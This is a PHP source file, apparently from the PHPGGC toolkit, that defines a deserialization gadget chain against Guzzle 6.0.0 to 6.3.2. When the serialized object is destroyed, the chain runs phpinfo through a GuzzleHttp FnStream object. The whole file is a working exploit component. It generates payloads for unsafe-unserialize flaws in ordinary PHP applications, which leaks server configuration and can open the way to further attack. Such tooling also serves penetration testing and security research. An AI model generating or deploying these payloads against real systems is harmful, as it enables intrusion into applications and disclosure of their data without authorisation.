<?php

namespace GadgetChain\Guzzle;

class INFO1 extends \PHPGGC\GadgetChain\PHPInfo
{
    public static $version = '6.0.0 <= 6.3.2';
    public static $vector = '__destruct';
    public static $author = 'erwan_lr';
    public static $information = '
        This chain requires GuzzleHttp\Psr7 < 1.5.0, because FnStream cannot be
        deserialized afterwards.
        See https://github.com/ambionics/phpggc/issues/34
    ';

    public function generate(array $parameters)
    {
        return new \GuzzleHttp\Psr7\FnStream();
    }
}
